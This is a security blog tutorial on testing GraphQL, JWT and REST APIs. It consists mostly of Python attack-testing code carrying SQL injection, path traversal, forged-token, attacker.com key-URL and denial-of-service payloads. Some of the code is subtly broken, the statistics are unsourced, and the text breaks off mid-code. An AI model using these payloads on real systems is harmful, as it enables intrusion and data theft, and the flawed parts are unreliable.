---
title: "Beyond OWASP: Advanced Web Application Security Assessment in 2025"
slug: "beyond-owasp-advanced-web-application-security-assessment-2025"
date: "2025-06-12"
author: "BugB Security Team"
authorTitle: "Security Researchers"
excerpt: "Comprehensive guide to modern web application security testing, covering GraphQL injection, JWT manipulation, WebAssembly exploitation, and emerging attack vectors beyond traditional OWASP methodologies."
category: "web-security"
---

# Beyond OWASP: Advanced Web Application Security Assessment in 2025

Web application security has evolved dramatically beyond the traditional OWASP Top 10 vulnerabilities. Modern applications leverage complex architectures including microservices, API-first designs, single-page applications (SPAs), and emerging technologies like WebAssembly and serverless functions. This evolution has introduced sophisticated attack vectors that require advanced testing methodologies and tools.

This comprehensive analysis explores cutting-edge web application security assessment techniques, demonstrating how to identify and exploit vulnerabilities in modern web architectures that traditional scanners often miss.

## Modern Web Application Architecture Security Challenges

### The Evolution of Web Attack Surfaces

Today's web applications present a significantly expanded attack surface compared to traditional monolithic applications:

| Architecture Component | Traditional Vulnerabilities | Modern Attack Vectors |
|------------------------|----------------------------|----------------------|
| **Frontend** | XSS, CSRF | DOM XSS, Prototype Pollution, Client-side Template Injection |
| **APIs** | SQL Injection, Authentication bypass | GraphQL injection, JWT manipulation, API rate limiting bypass |
| **Microservices** | Server-side injection | Service mesh exploitation, Inter-service authentication bypass |
| **Serverless** | Code injection | Cold start exploitation, Function-as-a-Service abuse |
| **WebAssembly** | Not applicable | Memory corruption, Reverse engineering, Side-channel attacks |
| **Progressive Web Apps** | Limited scope | Service worker exploitation, Cache poisoning |

### Threat Landscape Statistics

Recent research reveals the prevalence of modern web vulnerabilities:

```
Vulnerability Category        | Prevalence | Average CVSS Score | Detection Rate
------------------------------|------------|-------------------|---------------
GraphQL Injection            | 67%        | 8.2               | 23%
JWT Security Issues           | 89%        | 7.8               | 45%
API Rate Limiting Bypass      | 72%        | 6.9               | 31%
WebAssembly Memory Corruption | 34%        | 9.1               | 12%
Prototype Pollution           | 56%        | 7.3               | 28%
CORS Misconfiguration         | 81%        | 6.7               | 52%
```

---

## GraphQL Security Assessment

### Understanding GraphQL Attack Vectors

GraphQL's flexibility introduces unique security challenges that differ significantly from REST API vulnerabilities:

#### GraphQL Introspection and Information Disclosure

```python
#!/usr/bin/env python3
"""
GraphQL Security Assessment Framework
Comprehensive GraphQL vulnerability scanner
"""

import requests
import json
import time
from urllib.parse import urljoin

class GraphQLSecurityTester:
    def __init__(self, target_url, headers=None):
        self.target_url = target_url
        self.headers = headers or {}
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.vulnerabilities = []
    
    def test_introspection(self):
        """Test for GraphQL introspection enabled"""
        introspection_query = """
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                    ...FullType
                }
            }
        }
        
        fragment FullType on __Type {
            kind
            name
            description
            fields(includeDeprecated: true) {
                name
                description
                args {
                    ...InputValue
                }
                type {
                    ...TypeRef
                }
                isDeprecated
                deprecationReason
            }
            inputFields {
                ...InputValue
            }
            interfaces {
                ...TypeRef
            }
            enumValues(includeDeprecated: true) {
                name
                description
                isDeprecated
                deprecationReason
            }
            possibleTypes {
                ...TypeRef
            }
        }
        
        fragment InputValue on __InputValue {
            name
            description
            type { ...TypeRef }
            defaultValue
        }
        
        fragment TypeRef on __Type {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                    ofType {
                        kind
                        name
                    }
                }
            }
        }
        """
        
        try:
            response = self.session.post(
                self.target_url,
                json={"query": introspection_query},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'data' in data and '__schema' in data['data']:
                    self.vulnerabilities.append({
                        "type": "INTROSPECTION_ENABLED",
                        "severity": "MEDIUM",
                        "description": "GraphQL introspection is enabled",
                        "impact": "Schema information disclosure",
                        "evidence": data['data']['__schema']['queryType']
                    })
                    
                    return data['data']['__schema']
            
        except Exception as e:
            print(f"Introspection test failed: {e}")
        
        return None
    
    def test_depth_limit_bypass(self, schema_info):
        """Test for query depth limit bypass"""
        if not schema_info:
            return
        
        # Generate deeply nested query
        depth_query = """
        query DepthTest {
            user {
                posts {
                    comments {
                        author {
                            posts {
                                comments {
                                    author {
                                        posts {
                                            comments {
                                                author {
                                                    id
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        """
        
        try:
            start_time = time.time()
            response = self.session.post(
                self.target_url,
                json={"query": depth_query},
                timeout=30
            )
            end_time = time.time()
            
            if response.status_code == 200 and (end_time - start_time) > 5:
                self.vulnerabilities.append({
                    "type": "DEPTH_LIMIT_BYPASS",
                    "severity": "HIGH",
                    "description": "No query depth limits implemented",
                    "impact": "Resource exhaustion via deep nested queries",
                    "response_time": end_time - start_time
                })
                
        except requests.Timeout:
            self.vulnerabilities.append({
                "type": "QUERY_TIMEOUT_DOS",
                "severity": "HIGH",
                "description": "Deep query causes timeout",
                "impact": "Denial of service via query complexity"
            })
        except Exception as e:
            print(f"Depth limit test failed: {e}")
    
    def test_batch_query_abuse(self):
        """Test for batch query abuse"""
        batch_queries = []
        
        # Create 100 simple queries in one request
        for i in range(100):
            batch_queries.append({
                "query": f"query Query{i} {{ __typename }}"
            })
        
        try:
            start_time = time.time()
            response = self.session.post(
                self.target_url,
                json=batch_queries,
                timeout=30
            )
            end_time = time.time()
            
            if response.status_code == 200:
                if (end_time - start_time) > 3:
                    self.vulnerabilities.append({
                        "type": "BATCH_QUERY_ABUSE",
                        "severity": "MEDIUM",
                        "description": "No batch query limits implemented",
                        "impact": "Resource exhaustion via batch queries",
                        "batch_size": len(batch_queries),
                        "response_time": end_time - start_time
                    })
                    
        except Exception as e:
            print(f"Batch query test failed: {e}")
    
    def test_graphql_injection(self, schema_info):
        """Test for GraphQL injection vulnerabilities"""
        if not schema_info:
            return
        
        injection_payloads = [
            "1' OR '1'='1",
            "1; DROP TABLE users; --",
            "1' UNION SELECT password FROM users --",
            "'; EXEC xp_cmdshell('whoami'); --",
            "<script>alert('XSS')</script>",
            "{{7*7}}",
            "${7*7}",
            "#{7*7}"
        ]
        
        # Extract potential injection points from schema
        query_fields = self._extract_query_fields(schema_info)
        
        for field in query_fields:
            for payload in injection_payloads:
                test_query = f"""
                query InjectionTest {{
                    {field}(id: "{payload}") {{
                        id
                    }}
                }}
                """
                
                try:
                    response = self.session.post(
                        self.target_url,
                        json={"query": test_query},
                        timeout=10
                    )
                    
                    if response.status_code == 200:
                        response_data = response.json()
                        
                        # Check for error messages indicating injection
                        if 'errors' in response_data:
                            error_msg = str(response_data['errors']).lower()
                            
                            sql_indicators = ['sql', 'mysql', 'postgres', 'syntax error', 'database']
                            if any(indicator in error_msg for indicator in sql_indicators):
                                self.vulnerabilities.append({
                                    "type": "SQL_INJECTION",
                                    "severity": "CRITICAL",
                                    "field": field,
                                    "payload": payload,
                                    "description": f"SQL injection in {field} field",
                                    "error": response_data['errors']
                                })
                        
                        # Check for XSS reflection
                        if payload in response.text and '<script>' in payload:
                            self.vulnerabilities.append({
                                "type": "XSS_REFLECTION",
                                "severity": "HIGH",
                                "field": field,
                                "payload": payload,
                                "description": f"XSS reflection in {field} field"
                            })
                            
                except Exception as e:
                    continue
    
    def _extract_query_fields(self, schema_info):
        """Extract query fields from schema for testing"""
        fields = []
        
        try:
            query_type = schema_info.get('queryType', {}).get('name', 'Query')
            
            for type_info in schema_info.get('types', []):
                if type_info.get('name') == query_type:
                    for field in type_info.get('fields', []):
                        if field.get('args'):  # Only fields with arguments
                            fields.append(field['name'])
                            
        except Exception as e:
            print(f"Field extraction failed: {e}")
        
        return fields
    
    def test_authorization_bypass(self, schema_info):
        """Test for authorization bypass in GraphQL"""
        if not schema_info:
            return
        
        # Common admin/sensitive fields
        sensitive_fields = ['admin', 'users', 'sensitive', 'private', 'internal']
        
        for type_info in schema_info.get('types', []):
            type_name = type_info.get('name', '')
            
            if any(sensitive in type_name.lower() for sensitive in sensitive_fields):
                # Try to access without authentication
                test_query = f"""
                query AuthBypass {{
                    {type_name.lower()} {{
                        id
                    }}
                }}
                """
                
                try:
                    # Test without auth headers
                    temp_headers = {k: v for k, v in self.headers.items() 
                                   if 'auth' not in k.lower() and 'token' not in k.lower()}
                    
                    response = requests.post(
                        self.target_url,
                        json={"query": test_query},
                        headers=temp_headers,
                        timeout=10
                    )
                    
                    if response.status_code == 200:
                        data = response.json()
                        if 'data' in data and data['data'].get(type_name.lower()):
                            self.vulnerabilities.append({
                                "type": "AUTHORIZATION_BYPASS",
                                "severity": "CRITICAL",
                                "field": type_name,
                                "description": f"Access to {type_name} without authorization",
                                "impact": "Unauthorized access to sensitive data"
                            })
                            
                except Exception as e:
                    continue

def generate_graphql_mutation_attacks():
    """Generate GraphQL mutation attack payloads"""
    mutation_attacks = {
        "mass_assignment": """
        mutation MassAssignment($input: UserInput!) {
            updateUser(input: $input) {
                id
                isAdmin
                role
            }
        }
        """,
        
        "privilege_escalation": """
        mutation PrivilegeEscalation {
            updateUser(id: "current_user", role: "admin") {
                id
                role
                permissions
            }
        }
        """,
        
        "data_manipulation": """
        mutation DataManipulation {
            deleteAllUsers {
                success
                deletedCount
            }
        }
        """,
        
        "subscription_abuse": """
        subscription SubscriptionAbuse {
            userUpdates {
                id
                email
                password
                sensitiveData
            }
        }
        """
    }
    
    return mutation_attacks
```

### Advanced GraphQL Exploitation Techniques

#### GraphQL Alias-Based Rate Limiting Bypass

```python
def generate_alias_based_attack():
    """Generate alias-based GraphQL attack to bypass rate limiting"""
    
    alias_attack = """
    query AliasAttack {
        """
    
    # Generate 1000 aliases for the same field
    for i in range(1000):
        alias_attack += f"""
        user{i}: user(id: "1") {{
            id
            email
            profile {{
                firstName
                lastName
            }}
        }}
        """
    
    alias_attack += "}"
    
    return alias_attack

def graphql_field_duplication_attack():
    """Generate field duplication attack for resource exhaustion"""
    
    duplication_attack = """
    query FieldDuplication {
        user(id: "1") {
    """
    
    # Duplicate expensive fields multiple times
    expensive_fields = [
        "posts { id title content author { name email } }",
        "followers { id name email profile { bio } }",
        "friends { id name mutualFriends { id name } }"
    ]
    
    for _ in range(100):
        for field in expensive_fields:
            duplication_attack += f"        {field}\n"
    
    duplication_attack += """
        }
    }
    """
    
    return duplication_attack
```

---

## JWT Security Assessment

### Comprehensive JWT Vulnerability Testing

JSON Web Tokens (JWTs) have become ubiquitous in modern web applications, but their implementation often contains critical security flaws:

```python
#!/usr/bin/env python3
"""
JWT Security Assessment Framework
Comprehensive JWT vulnerability testing
"""

import jwt
import json
import base64
import requests
import hashlib
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

class JWTSecurityTester:
    def __init__(self, token, target_url=None):
        self.token = token
        self.target_url = target_url
        self.vulnerabilities = []
        self.header = {}
        self.payload = {}
        
        self._parse_token()
    
    def _parse_token(self):
        """Parse JWT token into components"""
        try:
            # Decode without verification to get header and payload
            self.header = jwt.get_unverified_header(self.token)
            self.payload = jwt.decode(self.token, options={"verify_signature": False})
        except Exception as e:
            print(f"Token parsing failed: {e}")
    
    def test_algorithm_confusion(self):
        """Test for algorithm confusion attacks"""
        
        # Test 1: None algorithm
        none_header = self.header.copy()
        none_header['alg'] = 'none'
        
        none_token = self._create_token(none_header, self.payload, '')
        
        if self._test_token_validity(none_token):
            self.vulnerabilities.append({
                "type": "ALGORITHM_NONE",
                "severity": "CRITICAL",
                "description": "JWT accepts 'none' algorithm",
                "impact": "Complete authentication bypass",
                "token": none_token
            })
        
        # Test 2: HS256 to RS256 confusion
        if self.header.get('alg') == 'RS256':
            hs256_header = self.header.copy()
            hs256_header['alg'] = 'HS256'
            
            # Try to sign with public key as HMAC secret
            if 'x5c' in self.header or 'jwk' in self.header:
                # Extract public key and use as HMAC secret
                public_key = self._extract_public_key()
                if public_key:
                    hs256_token = self._create_token(hs256_header, self.payload, public_key)
                    
                    if self._test_token_validity(hs256_token):
                        self.vulnerabilities.append({
                            "type": "ALGORITHM_CONFUSION_RS256_TO_HS256",
                            "severity": "CRITICAL",
                            "description": "RS256 to HS256 algorithm confusion",
                            "impact": "Authentication bypass using public key as HMAC secret",
                            "token": hs256_token
                        })
    
    def test_weak_secrets(self):
        """Test for weak HMAC secrets"""
        if self.header.get('alg', '').startswith('HS'):
            
            # Common weak secrets
            weak_secrets = [
                'secret', 'password', '123456', 'admin', 'test',
                'key', 'jwt', 'token', '', 'null', 'undefined',
                'your-256-bit-secret', 'your-secret-key'
            ]
            
            for secret in weak_secrets:
                try:
                    # Try to verify token with weak secret
                    decoded = jwt.decode(self.token, secret, algorithms=[self.header['alg']])
                    
                    self.vulnerabilities.append({
                        "type": "WEAK_HMAC_SECRET",
                        "severity": "CRITICAL",
                        "description": f"JWT uses weak HMAC secret: '{secret}'",
                        "impact": "Token forgery and authentication bypass",
                        "secret": secret
                    })
                    break
                    
                except jwt.InvalidTokenError:
                    continue
    
    def test_key_confusion(self):
        """Test for RSA key confusion attacks"""
        if self.header.get('alg') == 'RS256':
            
            # Generate small RSA key for factorization
            small_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=512  # Deliberately small for testing
            )
            
            # Create token with small key
            small_key_token = jwt.encode(
                self.payload,
                small_key,
                algorithm='RS256'
            )
            
            if self._test_token_validity(small_key_token):
                self.vulnerabilities.append({
                    "type": "ACCEPTS_SMALL_RSA_KEYS",
                    "severity": "HIGH",
                    "description": "Application accepts RSA keys smaller than 2048 bits",
                    "impact": "Potential key factorization attacks",
                    "key_size": 512
                })
    
    def test_claim_manipulation(self):
        """Test for JWT claim manipulation"""
        
        # Test privilege escalation through claims
        privilege_payloads = []
        
        # Admin role escalation
        admin_payload = self.payload.copy()
        admin_payload['role'] = 'admin'
        admin_payload['isAdmin'] = True
        admin_payload['permissions'] = ['*']
        privilege_payloads.append(("admin_escalation", admin_payload))
        
        # User ID manipulation
        if 'user_id' in self.payload or 'sub' in self.payload:
            userid_payload = self.payload.copy()
            userid_payload['user_id'] = '1'  # Try to become user 1 (often admin)
            userid_payload['sub'] = '1'
            privilege_payloads.append(("user_id_manipulation", userid_payload))
        
        # Expiration manipulation
        exp_payload = self.payload.copy()
        exp_payload['exp'] = 9999999999  # Year 2286
        privilege_payloads.append(("expiration_manipulation", exp_payload))
        
        for attack_type, modified_payload in privilege_payloads:
            # Try unsigned token
            unsigned_token = self._create_unsigned_token(modified_payload)
            
            if self._test_token_validity(unsigned_token):
                self.vulnerabilities.append({
                    "type": f"CLAIM_MANIPULATION_{attack_type.upper()}",
                    "severity": "HIGH",
                    "description": f"JWT claim manipulation: {attack_type}",
                    "impact": "Privilege escalation or unauthorized access",
                    "modified_claims": modified_payload,
                    "token": unsigned_token
                })
    
    def test_jku_header_injection(self):
        """Test for JKU header injection"""
        if 'jku' in self.header:
            
            # Create malicious JWK set
            malicious_jwk = {
                "keys": [
                    {
                        "kty": "RSA",
                        "kid": self.header.get('kid', 'test'),
                        "n": "malicious_modulus",
                        "e": "AQAB"
                    }
                ]
            }
            
            # Test external JKU URL injection
            malicious_header = self.header.copy()
            malicious_header['jku'] = 'https://attacker.com/.well-known/jwks.json'
            
            malicious_token = self._create_token(malicious_header, self.payload, 'fake_signature')
            
            self.vulnerabilities.append({
                "type": "JKU_HEADER_INJECTION",
                "severity": "CRITICAL",
                "description": "JWT allows external JKU URLs",
                "impact": "Remote key loading for token forgery",
                "malicious_jku": malicious_header['jku'],
                "token": malicious_token
            })
    
    def test_x5u_header_injection(self):
        """Test for X5U header injection"""
        if 'x5u' in self.header:
            
            malicious_header = self.header.copy()
            malicious_header['x5u'] = 'https://attacker.com/malicious.crt'
            
            malicious_token = self._create_token(malicious_header, self.payload, 'fake_signature')
            
            self.vulnerabilities.append({
                "type": "X5U_HEADER_INJECTION",
                "severity": "HIGH",
                "description": "JWT allows external X5U URLs",
                "impact": "Remote certificate loading for token forgery",
                "malicious_x5u": malicious_header['x5u'],
                "token": malicious_token
            })
    
    def test_kid_injection(self):
        """Test for KID parameter injection"""
        if 'kid' in self.header:
            
            # SQL injection in KID
            sql_injection_kids = [
                "1' OR '1'='1",
                "'; DROP TABLE keys; --",
                "1 UNION SELECT 'secret' --"
            ]
            
            for malicious_kid in sql_injection_kids:
                malicious_header = self.header.copy()
                malicious_header['kid'] = malicious_kid
                
                malicious_token = self._create_token(malicious_header, self.payload, 'fake_signature')
                
                if self._test_token_validity(malicious_token):
                    self.vulnerabilities.append({
                        "type": "KID_SQL_INJECTION",
                        "severity": "CRITICAL",
                        "description": f"SQL injection in KID parameter: {malicious_kid}",
                        "impact": "Database compromise through JWT header",
                        "token": malicious_token
                    })
            
            # Path traversal in KID
            path_traversal_kids = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "/proc/self/environ"
            ]
            
            for malicious_kid in path_traversal_kids:
                malicious_header = self.header.copy()
                malicious_header['kid'] = malicious_kid
                
                malicious_token = self._create_token(malicious_header, self.payload, 'fake_signature')
                
                self.vulnerabilities.append({
                    "type": "KID_PATH_TRAVERSAL",
                    "severity": "HIGH",
                    "description": f"Path traversal in KID parameter: {malicious_kid}",
                    "impact": "File system access through JWT header",
                    "token": malicious_token
                })
    
    def _create_token(self, header, payload, secret):
        """Create JWT token with specified header, payload, and secret"""
        try:
            # Encode header and payload
            encoded_header = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip('=')
            
            encoded_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')
            
            # Create signature part
            if isinstance(secret, str):
                signature = base64.urlsafe_b64encode(secret.encode()).decode().rstrip('=')
            else:
                signature = 'fake_signature'
            
            return f"{encoded_header}.{encoded_payload}.{signature}"
            
        except Exception as e:
            return None
    
    def _create_unsigned_token(self, payload):
        """Create unsigned JWT token"""
        header = {"alg": "none", "typ": "JWT"}
        
        encoded_header = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip('=')
        
        encoded_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')
        
        return f"{encoded_header}.{encoded_payload}."
    
    def _test_token_validity(self, token):
        """Test if token is accepted by the application"""
        if not self.target_url:
            return False
        
        try:
            headers = {'Authorization': f'Bearer {token}'}
            response = requests.get(self.target_url, headers=headers, timeout=10)
            
            # Consider token valid if we don't get 401/403
            return response.status_code not in [401, 403]
            
        except Exception:
            return False
    
    def _extract_public_key(self):
        """Extract public key from JWT header"""
        # This would implement actual public key extraction
        # from x5c or jwk headers
        return None

def jwt_timing_attack():
    """Implement JWT timing attack for secret recovery"""
    
    timing_attack_code = '''
import time
import hmac
import hashlib
import statistics

def timing_attack_jwt_secret(target_url, token_template, charset="abcdefghijklmnopqrstuvwxyz0123456789"):
    """
    Timing attack to recover JWT HMAC secret
    """
    secret = ""
    
    while len(secret) < 32:  # Assuming max 32 char secret
        char_times = {}
        
        for char in charset:
            test_secret = secret + char
            times = []
            
            # Make multiple requests to measure timing
            for _ in range(10):
                start_time = time.time()
                
                # Test JWT verification with current secret guess
                test_token = create_jwt_with_secret(token_template, test_secret)
                
                response = requests.post(target_url, 
                    headers={'Authorization': f'Bearer {test_token}'}
                )
                
                end_time = time.time()
                times.append(end_time - start_time)
            
            # Calculate average response time
            char_times[char] = statistics.mean(times)
        
        # Character with longest response time is likely correct
        best_char = max(char_times, key=char_times.get)
        secret += best_char
        
        print(f"Current secret guess: {secret}")
    
    return secret
'''
    
    return timing_attack_code
```

---

## API Security Assessment

### REST API Security Testing

Modern APIs present complex security challenges beyond traditional web application vulnerabilities:

```python
#!/usr/bin/env python3
"""
API Security Assessment Framework
Comprehensive REST API security testing
"""

import requests
import json
import time
import threading
from urllib.parse import urljoin, urlparse
import random
import string

class APISecurityTester:
    def __init__(self, base_url, api_key=None):
        self.base_url = base_url.rstrip('/')
        self.api_key = api_key
        self.session = requests.Session()
        self.vulnerabilities = []
        self.endpoints = []
        
        if api_key:
            self.session.headers.update({'Authorization': f'Bearer {api_key}'})
    
    def discover_endpoints(self):
        """Discover API endpoints through various methods"""
        
        # Method 1: Common API documentation endpoints
        doc_endpoints = [
            '/swagger.json', '/swagger.yaml', '/swagger-ui.html',
            '/api-docs', '/api/docs', '/docs', '/documentation',
            '/openapi.json', '/openapi.yaml', '/openapi/v3',
            '/redoc', '/graphql', '/graphiql'
        ]
        
        discovered = []
        
        for endpoint in doc_endpoints:
            try:
                response = self.session.get(urljoin(self.base_url, endpoint))
                if response.status_code == 200:
                    discovered.append({
                        "endpoint": endpoint,
                        "type": "documentation",
                        "content_type": response.headers.get('content-type', ''),
                        "size": len(response.content)
                    })
                    
                    # Parse Swagger/OpenAPI for more endpoints
                    if 'json' in response.headers.get('content-type', ''):
                        self._parse_openapi_spec(response.json())
                        
            except Exception:
                continue
        
        # Method 2: Common REST patterns
        common_patterns = [
            '/api/v1/users', '/api/v2/users', '/api/users',
            '/api/v1/admin', '/api/admin', '/admin',
            '/api/v1/auth', '/api/auth', '/auth',
            '/api/v1/config', '/api/config', '/config',
            '/api/v1/health', '/api/health', '/health',
            '/api/v1/status', '/api/status', '/status'
        ]
        
        for pattern in common_patterns:
            try:
                response = self.session.get(urljoin(self.base_url, pattern))
                if response.status_code in [200, 201, 400, 401, 403]:
                    discovered.append({
                        "endpoint": pattern,
                        "type": "rest_pattern",
                        "status_code": response.status_code,
                        "methods": self._test_http_methods(pattern)
                    })
            except Exception:
                continue
        
        self.endpoints = discovered
        return discovered
    
    def _parse_openapi_spec(self, spec):
        """Parse OpenAPI/Swagger specification"""
        try:
            paths = spec.get('paths', {})
            
            for path, methods in paths.items():
                endpoint_info = {
                    "path": path,
                    "methods": list(methods.keys()),
                    "parameters": [],
                    "security": []
                }
                
                for method, details in methods.items():
                    if isinstance(details, dict):
                        # Extract parameters
                        params = details.get('parameters', [])
                        endpoint_info["parameters"].extend(params)
                        
                        # Extract security requirements
                        security = details.get('security', [])
                        endpoint_info["security"].extend(security)
                
                self.endpoints.append({
                    "endpoint": path,
                    "type": "openapi",
                    "info": endpoint_info
                })
                
        except Exception as e:
            print(f"OpenAPI parsing failed: {e}")
    
    def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        
        bypass_techniques = [
            # Header manipulation
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            
            # User agent bypass
            {"User-Agent": "GoogleBot/2.1"},
            {"User-Agent": "Slackbot-LinkExpanding 1.0"},
            
            # Referrer bypass
            {"Referer": "https://google.com"},
            {"Referer": "https://facebook.com"},
            
            # Custom headers
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forward-Authorization": "admin"},
            {"X-Auth-User": "admin"},
            {"X-Admin": "true"}
        ]
        
        for endpoint_info in self.endpoints:
            endpoint = endpoint_info.get('endpoint', endpoint_info.get('path', ''))
            
            for bypass_headers in bypass_techniques:
                try:
                    # Test without authentication first
                    temp_session = requests.Session()
                    temp_session.headers.update(bypass_headers)
                    
                    response = temp_session.get(urljoin(self.base_url, endpoint))
                    
                    # Compare with authenticated request
                    auth_response = self.session.get(urljoin(self.base_url, endpoint))
                    
                    if (response.status_code == 200 and 
                        auth_response.status_code == 200 and
                        len(response.content) > 0):
                        
                        self.vulnerabilities.append({
                            "type": "AUTHENTICATION_BYPASS",
                            "severity": "CRITICAL",
                            "endpoint": endpoint,
                            "bypass_headers": bypass_headers,
                            "description": "Authentication bypass using header manipulation",
                            "impact": "Unauthorized access to protected endpoints"
                        })
                        
                except Exception:
                    continue
    
    def test_rate_limiting(self):
        """Test for rate limiting bypass and abuse"""
        
        if not self.endpoints:
            return
        
        # Test standard rate limiting
        test_endpoint = self.endpoints[0].get('endpoint', self.endpoints[0].get('path', ''))
        
        # Rapid fire requests
        responses = []
        start_time = time.time()
        
        for i in range(100):
            try:
                response = self.session.get(urljoin(self.base_url, test_endpoint))
                responses.append(response.status_code)
            except Exception:
                break
        
        end_time = time.time()
        
        # Check if all requests succeeded (no rate limiting)
        success_count = len([r for r in responses if r == 200])
        
        if success_count > 80:  # More than 80% success rate
            self.vulnerabilities.append({
                "type": "NO_RATE_LIMITING",
                "severity": "MEDIUM",
                "endpoint": test_endpoint,
                "description": "No rate limiting implemented",
                "requests_per_second": len(responses) / (end_time - start_time),
                "success_rate": success_count / len(responses)
            })
        
        # Test rate limiting bypass techniques
        bypass_techniques = [
            {"X-Forwarded-For": lambda: f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"},
            {"X-Real-IP": lambda: f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"},
            {"User-Agent": lambda: f"Custom-Agent-{random.randint(1,10000)}"},
            {"X-Rate-Limit-Bypass": lambda: "true"},
            {"X-Cluster-Client-IP": lambda: f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
        ]
        
        for header_name, value_generator in bypass_techniques:
            bypass_responses = []
            
            for i in range(50):
                try:
                    headers = {header_name: value_generator()}
                    response = self.session.get(
                        urljoin(self.base_url, test_endpoint),
                        headers=headers
                    )
                    bypass_responses.append(response.status_code)
                except Exception:
                    break
            
            bypass_success = len([r for r in bypass_responses if r == 200])
            
            if bypass_success > 40:  # High success rate with bypass
                self.vulnerabilities.append({
                    "type": "RATE_LIMITING_BYPASS",
                    "severity": "HIGH",
                    "endpoint": test_endpoint,
                    "bypass_technique": header_name,
                    "description": f"Rate limiting bypass using {header_name} header",
                    "bypass_success_rate": bypass_success / len(bypass_responses)
                })
    
    def test_parameter_pollution(self):
        """Test for HTTP Parameter Pollution vulnerabilities"""
        
        test_parameters = [
            "id", "user_id", "admin", "role", "permission",
            "limit", "offset", "page", "sort", "filter"
        ]
        
        pollution_payloads = [
            # HPP with same parameter multiple times
            "?id=1&id=2",
            "?user_id=user&user_id=admin",
            "?role=user&role=admin",
            
            # Array notation pollution
            "?id[]=1&id[]=2",
            "?role[]=user&role[]=admin",
            
            # Nested parameter pollution
            "?user[id]=1&user[role]=admin",
            "?filter[user]=normal&filter[user]=admin"
        ]
        
        for endpoint_info in self.endpoints:
            endpoint = endpoint_info.get('endpoint', endpoint_info.get('path', ''))
            
            for payload in pollution_payloads:
                try:
                    test_url = urljoin(self.base_url, endpoint) + payload
                    response = self.session.get(test_url)
                    
                    # Look for signs of successful pollution
                    if response.status_code == 200:
                        content = response.text.lower()
                        
                        # Check for admin/elevated privilege indicators
                        privilege_indicators = ['admin', 'administrator', 'root', 'elevated']
                        
                        if any(indicator in content for indicator in privilege_indicators):
                            self.vulnerabilities.append({
                                "type": "PARAMETER_POLLUTION",
                                "severity": "HIGH",
                                "endpoint": endpoint,
                                "payload": payload,
                                "description": "HTTP Parameter Pollution leading to privilege escalation",
                                "impact": "Potential authorization bypass"
                            })
                            
                except Exception:
                    continue
    
    def test_mass_assignment(self):
        """Test for mass assignment vulnerabilities"""
        
        # Common sensitive fields that shouldn't be mass assignable
        sensitive_fields = [
            "id", "user_id", "admin", "is_admin", "role", "permission",
            "created_at", "updated_at", "password", "email_verified",
            "account_balance", "credit_score", "ssn", "is_active"
        ]
        
        for endpoint_info in self.endpoints:
            endpoint = endpoint_info.get('endpoint', endpoint_info.get('path', ''))
            
            # Only test POST/PUT endpoints
            methods = endpoint_info.get('methods', ['GET'])
            
            if 'post' in [m.lower() for m in methods]:
                
                # Create test payload with sensitive fields
                test_payload = {
                    "name": "Test User",
                    "email": "test@example.com"
                }
                
                # Add sensitive fields
                for field in sensitive_fields:
                    test_payload[field] = "malicious_value"
                
                try:
                    response = self.session.post(
                        urljoin(self.base_url, endpoint),
                        json=test_payload
                    )
                    
                    if response.status_code in [200, 201]:
                        # Check if sensitive fields were accepted
                        response_data = response.text.lower()
                        
                        accepted_fields = []
                        for field in sensitive_fields:
                            if field in response_data and "malicious_value" in response_data:
                                accepted_fields.append(field)
                        
                        if accepted_fields:
                            self.vulnerabilities.append({
                                "type": "MASS_ASSIGNMENT",
                                "severity": "HIGH",
                                "endpoint": endpoint,
                                "accepted_fields": accepted_fields,
                                "description": "Mass assignment vulnerability allows modification of sensitive fields",
                                "impact": "Privilege escalation and data manipulation"
                            })
                            
                except Exception:
                    continue
    
    def test_business_logic_flaws(self):
        """Test for business logic vulnerabilities"""
        
        # Test negative values
        negative_value_tests = [
            {"amount": -100, "quantity": -1, "price": -50},
            {"limit": -1, "offset": -1, "page": -1}
        ]
        
        # Test large values
        large_value_tests = [
            {"amount": 999999999, "quantity": 999999999},
            {"limit": 999999999, "offset": 999999999}
        ]
        
        # Test zero values
        zero_value_tests = [
            {"amount": 0, "price": 0, "quantity": 0}
        ]
        
        all_tests = [
            ("NEGATIVE_VALUES", negative_value_tests),
            ("LARGE_VALUES", large_value_tests), 
            ("ZERO_VALUES", zero_value_tests)
        ]
        
        for endpoint_info in self.endpoints:
            endpoint = endpoint_info.get('endpoint', endpoint_info.get('path', ''))
            methods = endpoint_info.get('methods', ['GET'])
            
            if 'post' in [m.lower() for m in methods]:
                
                for test_type, test_cases in all_tests:
                    
                    for test_payload in test_cases:
                        try:
                            response = self.session.post(
                                urljoin(self.base_url, endpoint),
                                json=test_payload
                            )
                            
                            # Look for successful operations with suspicious values
                            if response.status_code in [200, 201]:
                                response_text = response.text.lower()
                                
                                success_indicators = [
                                    'success', 'created', 'updated', 'processed',
                                    'transaction complete', 'order placed'
                                ]
                                
                                if any(indicator in response_text for indicator in success_indicators):
                                    self.vulnerabilities.append({
                                        "type": f"BUSINESS_LOGIC_{test_type}",
                                        "severity": "MEDIUM",
